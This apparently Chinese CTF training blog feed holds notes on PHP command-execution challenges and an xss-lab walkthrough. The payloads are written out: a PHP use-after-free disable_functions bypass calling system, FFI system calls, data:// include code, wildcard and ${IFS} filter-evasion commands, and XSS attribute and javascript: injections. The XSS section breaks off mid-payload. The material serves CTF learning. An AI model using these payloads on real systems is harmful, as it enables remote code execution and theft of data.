class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> Helper;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || strlen(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = leak(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = get_binary_base(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = parse_elf(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = get_basic_funcs(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = get_system(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        write(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, leak(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br>ctfshow(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();<br><span class="hljs-comment">#需要通过url编码</span><br></code></pre></td></tr></table></figure><p>数据库load_file读取：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">try</span> &#123;<span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; &#125;<span class="hljs-variable">$dbh</span> = <span class="hljs-literal">null</span>;&#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;getMessage();<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">#删除所有缩进</span><br></code></pre></td></tr></table></figure><p>php74特性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<span class="hljs-comment">//创建一个system对象</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="hljs-comment">//没有回显的</span><br><span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//通过$ffi去调用system函数</span><br></code></pre></td></tr></table></figure><blockquote><p>${PATH:~A}${PWD:~A}${IFS}????.???</p></blockquote><h2 id="include-c"><a href="#include-c" class="headerlink" title="include(c)"></a>include(c)</h2><p>data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行</p><blockquote><p>data://text/plain,&lt;?php system(ls)?&gt;</p><p>data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p></blockquote><p>也可以包含日志文件 抓包 在UA或者头部访问一句话即不存在的资源  放包 然后包含即可</p><h2 id="system-c"><a href="#system-c" class="headerlink" title="system(c)"></a>system(c)</h2><ul><li>回显丢进黑洞</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>执行shell命令时，会默认打开三个文件</p><table><thead><tr><th align="center">类型</th><th align="center">文件描述符</th><th align="center">执行情况</th><th align="center">句柄位置</th></tr></thead><tbody><tr><td align="center">标准输入</td><td align="center">0</td><td align="center">从键盘会的输入</td><td align="center">/proc/self/fd/0</td></tr><tr><td align="center">标准输出</td><td align="center">1</td><td align="center">输出到控制台</td><td align="center">/proc/self/fd/1</td></tr><tr><td align="center">错误输出</td><td align="center">2</td><td align="center">输出到控制台</td><td align="center">/proc/self/fd/2</td></tr></tbody></table><ol><li>输出</li></ol><table><thead><tr><th align="center">命令</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">command &gt;filename</td><td align="center">把标准输出重定向到新文件中</td></tr><tr><td align="center">command 1&gt;filename</td><td align="center">同上</td></tr><tr><td align="center">command &gt;&gt;filename</td><td align="center">把标准输出追加到文件中</td></tr><tr><td align="center">command 1&gt;&gt;filename</td><td align="center">同上</td></tr><tr><td align="center">command 2&gt;filename</td><td align="center">把标准错误重定向到新文件中</td></tr><tr><td align="center">command 2&gt;&gt;filename</td><td align="center">把标准错误追加到新文件中</td></tr></tbody></table><blockquote><p>假如更改文件描述符的指向，就能重定向输入输出。比如我们将1指向文件，那么标准的输出就会输出到文件中。</p><p>使用&gt;或者&gt;&gt;对<strong>输出</strong>进行重定向。符号的左边表示文件描述符，如果没有的话表示1，也就是标准输出，符号的右边可以是一个文件，也可以是一个输出设备。当使用&gt;时，会判断右边的文件存不存在，如果存在的话就覆盖，不存在的话则直接创建。但是当使用&gt;&gt;进行追加时，则不会删除原来已经存在的文件。</p><p>root@en1sksyfamnufy5g:~/Desktop# tree<br>.<br>└── a.txt</p><p>0 directories, 1 file<br>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt<br>ls: cannot access ‘b.txt’: No such file or directory<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# ^C<br>root@en1sksyfamnufy5g:~/Desktop# </p><p>在我们执行<code>ls a.txt b.txt</code>之后，一共有两种输出，其中<code>ls: </code>无法访问b.txt: 没有那个文件或目录是错误输出，a.txt是标准输出。</p><p>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt 1&gt;out<br>ls: cannot access ‘b.txt’: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt &gt;&gt;out<br>ls: cannot access ‘b.txt’: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>a.txt<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# </p><p>将原来的标准输出重定向到了out文件中，所以控制台只剩下了错误提示。并且当执行了追加操作时，out文件的内容非但没有被清空，反而又多了一条a.txt。下面我们将错误输出重定向到文件中：</p><p>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt 2&gt;err<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# cat err<br>ls: cannot access ‘b.txt’: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt &gt;out 2&gt;err<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# cat err<br>ls: cannot access ‘b.txt’: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop# </p></blockquote><ol start="2"><li>输入</li></ol><table><thead><tr><th align="center">命令</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">command &lt;filename</td><td align="center">以filename文件作为标准输入</td></tr><tr><td align="center">command 0&lt;filename</td><td align="center">同上</td></tr><tr><td align="center">command &lt;&lt;delimiter</td><td align="center">从标准输入中读入，直到遇到delimiter分隔符</td></tr></tbody></table><blockquote><p>使用&lt;对<strong>输入</strong>做重定向，如果符号左边没有写值，那么默认就是0。以cat命令为例，如果cat后面没有跟文件名的话，那它的作用就是将标准输入（比如键盘）回显到标准输出（比如屏幕）上：</p><p>root@en1sksyfamnufy5g:~/Desktop# cat<br>123<br>123<br>test<br>test</p><p>让cat读取一个文件，我们利用输入重定向：</p><p>root@en1sksyfamnufy5g:~/Desktop# cat a.txt<br>hello<br>root@en1sksyfamnufy5g:~/Desktop# cat &gt;out &lt;a.txt<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>hello<br>root@en1sksyfamnufy5g:~/Desktop# </p><p>我们可以看看上一次的cat out的内容是a.txt</p><p>root@en1sksyfamnufy5g:~/Desktop# cat &gt;out &lt;&lt;end</p><p>&gt;hhh<br>&gt;end<br>root@en1sksyfamnufy5g:~/Desktop# </p><p>当我们输入完<code>cat &gt;out &lt;&lt;end</code>，然后敲下回车之后，命令并没有结束，此时cat命令像一开始一样，等待你给它输入数据。然后当我们敲入end之后，cat命令就结束了。end之前输入的字符都已经被写入到了out文件中。这就是输入分割符的作用。</p></blockquote><p>回到<code>&gt;/dev/null 2&gt;&amp;1</code> 可以分为两部分</p><p><code>&gt;/dev/null</code></p><p>这条命令的作用是将标准输出1重定向到<code>/dev/null</code>中。 <code>/dev/null</code>代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了<code>&gt;/dev/null</code>之后，标准输出就会不再存在，没有任何地方能够找到输出的内容。</p><p><code>2&gt;&amp;1</code></p><p>这条命令用到了重定向绑定，采用&amp;可以将两个输出绑定在一起。这条命令的作用是错误输出将和标准输出同用一个文件描述符，说人话就是错误输出将会和标准输出输出到同一个地方。</p><p>linux在执行shell命令之前，就会确定好所有的输入输出位置，并且从左到右依次执行重定向的命令，所以<code>&gt;/dev/null 2&gt;&amp;1</code>的作用就是让标准输出重定向到<code>/dev/null</code>中（丢弃标准输出），然后错误输出由于重用了标准输出的描述符，所以错误输出也被定向到了<code>/dev/null</code>中，错误输出同样也被丢弃了。执行了这条命令之后，该条shell命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中。</p><p>回到题目，我们知道%0a是换行 那么构造payload如：</p><blockquote><p>?c=cat flag.php%0a</p></blockquote><p>在终端就会这样</p><blockquote><p>root@en1sksyfamnufy5g:~/Desktop# cat flag.php<br>flag{……}<br>root@en1sksyfamnufy5g:~/Desktop# &gt;/dev/null 2&gt;&amp;1<br>root@en1sksyfamnufy5g:~/Desktop# </p></blockquote><p>还可以利用分号</p><blockquote><p>root@en1sksyfamnufy5g:~/Desktop# cat 1.txt<br>hello</p><p>all seems fine<br>root@en1sksyfamnufy5g:~/Desktop# tac 1.txt<br>all seems fine</p><p>hello<br>root@en1sksyfamnufy5g:~/Desktop# cat 1.txt;tac 1.txt<br>hello</p><p>all seems fine<br>all seems fine</p><p>hello<br>root@en1sksyfamnufy5g:~/Desktop# </p></blockquote><p>payload：</p><blockquote><p>?c=cat flag.php;ls</p><p>这样命令就成为</p><p>root@en1sksyfamnufy5g:~/Desktop# cat flag.php;ls &gt;/dev/null 2&gt;&amp;1</p><p>…</p></blockquote><p>还有<code>||</code> <code>&amp;&amp;</code></p><ul><li>过滤了大量命令</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><ul><li><code>/bin</code>: bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。</li><li><code>/usr/bin</code>:主 要放置一些应用软体工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 gzip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、  newaliases、nslookup passwd、quota、smb*、wget等。</li><li><code>/sbin</code>: 主 要放置一些系统管理的必备程式例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、  ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、  runlevel、shutdown等。</li><li><code>/usr/sbin</code>:放置一些网路管理的必备程式例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等。</li></ul></blockquote><p>所以利用通配符就可以绕过，比如cat</p><blockquote><p>?c=/bin/ca?${IFS}f???????</p></blockquote><p>当然还有漏网之鱼可以利用</p><blockquote><p>grep${IFS}show${IFS}fla?.php</p></blockquote><ul><li>过滤所有小写字母</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>Ⅰ、如上所述，可以利用<code>目录+通配符匹配特殊含数字命令</code>绕过正则对函数的匹配 现在是小写字母不能出现，在bin目录下可以找到base64 </p><blockquote><p>下面两种用法等价：</p><p>root@en1sksyfamnufy5g:~/Desktop# base64 flag.php</p><p>root@en1sksyfamnufy5g:~/Desktop# cat flag.php | base64</p></blockquote><p>payload:</p><blockquote><p>?c=/???/????64 flag.php</p></blockquote><p>在/usr/bin下可以找到bzip2，先将flag.php文件进行压缩，然后再将其下载</p><blockquote><p>?c=/???/???/???2 flag.php</p><p>curl -O http://…/flag.php.bz2</p></blockquote><ul><li>无字母数字</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>Ⅱ、利用临时文件</p><p>可以向php上传一个shell文件，php会将其保存为<code>/tmp/phpxxxxxx</code>文件名最后6个字符是随机的大小写字母</p><p>可以利用通配符<code>/???/php??????</code> <code>/*/?????????</code>或<code>/???/?????????</code>但是这种匹配的准确性不高</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/67a4aab1-9e90-43e6-b3f1-3569c7009390.png"></p><p>我们加入准确性更高的正则匹配 可见只有临时文件包含有大写字母</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell</a></p><p>构造临时文件最后一位是大写的payload<code>/???/?????????[@-[]</code></p><p>(php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。)</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png"></p><blockquote><p>source命令：</p><p>source命令也称为“点命令”，也就是一个点符号（.）。</p><p>source命令通常用于重新执行刚修改的初始化文件，使之立即生效，而不必注销并重新登录。</p><p>用法： </p><p>source filename 或 . filename</p><p>source命令除了上述的用途之外，还有一个另外一个用途。在对编译系统核心时常常需要输入一长串的命令，如：</p><p>make mrproper</p><p>make menuconfig</p><p>make dep</p><p>make clean</p><p>make bzImage</p><p>…………</p><p>如果把这些命令做成一个文件，让它自动顺序执行，对于需要多次反复编译系统核心的用户来说会很方便，而用source命令就可以做到这一点，它的作用就是把一个文件的内容当成shell来执行，先在linux的源代码目录下（如/usr/src/linux-2.4.20）建立一个文件，如make_command，在其中输入一下内容：</p><p>make mrproper &amp;&amp;</p><p>make menuconfig &amp;&amp;</p><p>make dep &amp;&amp;</p><p>make clean &amp;&amp;</p><p>make bzImage &amp;&amp;</p><p>make modules &amp;&amp;</p><p>make modules_install &amp;&amp;</p><p>cp arch/i386/boot/bzImage /boot/vmlinuz_new &amp;&amp;</p><p>cp System.map /boot &amp;&amp;</p><p>vi /etc/lilo.conf &amp;&amp;</p><p>lilo -v</p><p>文件建立好之后，每次编译核心的时候，只需要在/usr/src/linux-2.4.20下输入：</p><p>source make_command</p><p>即可，如果你用的不是lilo来引导系统，可以把最后两行去掉，配置自己的引导程序来引导内核。</p><p>顺便补充一点，&amp;&amp;命令表示顺序执行由它连接的命令，但是只有它之前的命令成功执行完成了之后才可以继续执行它后面的命令。</p><p>通过<code>.</code>去执行sh命令不需要有执行权限</p></blockquote><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210815112747397.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210815112814014.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210815115542123.png"></p><p>能否使用sess上传进度</p><ul><li>shell数字构造</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><blockquote><p>shell下各变量的含义</p><p>${_} =”” //返回上一次命令<br>$((${_}))=0<br>$((~$((${_}))))=-1</p></blockquote><p>payload ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">num = <span class="hljs-string">&quot;$((~$((&quot;</span>+<span class="hljs-string">&quot;$((~$(())))&quot;</span>*<span class="hljs-number">37</span>+<span class="hljs-string">&quot;))))&quot;</span>//<span class="hljs-number">36</span><br><span class="hljs-built_in">print</span>(num)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS笔记</title>
    <link href="/2021/07/21/XSS%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/07/21/XSS%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>更改test为2 成功显示2</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721161249161.png"></p><p>输入<code>&lt;script&gt;&lt;/script&gt;</code>没有显示 按理来说应该会出现欢迎用户<code>&lt;script&gt;&lt;/script&gt;</code>才对，但是没有，到哪里去了，他被浏览器解析了，在这个标签中就可以插入你想执行的js代码<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721231844489.png"></p><p>需要弹窗才能下一关</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721231540223.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721160805637.png"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721232021324.png"></p><p>有输入框 直接插入失败 在查看器看一下源码 </p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721161841692.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721232250230.png"></p><p>发现上面的文字内容被html实体化编码了，但是下面输入框里还会显示原内容，但是在value值内浏览器无法解析，把value属性闭合，再把<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>”逃逸出去“  ==&gt; 构造<code>&gt;&quot;&lt;script&gt;&lt;/script&gt;//</code>, <code>//</code>是为了注释后面原有的<code>&gt;&quot;</code></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721161733218.png"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210721162035732.png"></p><p>发现连value值里的内容都被实体化编码了，所以，我们需要尝试其他办法来执行js代码，我们可以发现我们传入的值是在input标签中的，而标签都有属性，我们可以给他添加一个属性，利用这个属性来执行js代码,双引号闭合失败就尝试单引号闭合value</p><blockquote><p>‘onmouseover=’javascript:alert(1)</p><p>‘onmouseover=’alert(1)’</p></blockquote><p>这里onmouseover是嵌入到input中的一个属性，他的作用是鼠标滑过时执行javascript代码，成功绕过。</p><p>还有onclick，他的作用是点击时执行</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>和前一关不同的是使用了双引号进行闭合</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724113402660.png"></p><p>script被插进了下划线 说明匹配了&lt;script&gt; 双写 大小写可以尝试 都行不通</p><p>换个标签试一试</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724113621774.png"></p><p>同样构造闭合</p><blockquote><p>“&gt;&lt;a href=javascript:alert(1)&gt;click on&lt;/a&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724115942750.png"></p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>测试发现第五关的基础上对herf进行了匹配 进行大小写绕过</p><blockquote><p>“&gt;&lt;a Href=javascript:alert(1)&gt;click on&lt;/a&gt;</p></blockquote><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p>第五关提到的双写这里出现了<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724223917009.png"></p><p>可以看到提交后标签里的script不再是插入下划线 而是替换为空 那么尝试双写<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724224133906.png"></p><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724225137053.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724225156651.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724225227736.png"></p><p>点击链接后</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724225301905.png"></p><p>原来javascript被过滤了 可以将这个进行编码绕过 比如将最后一个字符进行编码<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724225948421.png"></p><p>得到<code>javascrip&amp;#116:alert()</code>放入框里添加链接 然后点击链接即可</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>无论什么都是链接不合法 看一下wp说需要<code>http://</code> 而且不能因为有<code>http://</code>影响注入</p><p>那么就注释掉</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724231259786.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210724231254317.png"></p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210726224553446.png"></p><p>直接插入不行   查看源码发现有三个input是hidden的  分别传参如下</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210726224355595.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210726224412941.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210726224450585.png"></p><blockquote><p>t_sort=” 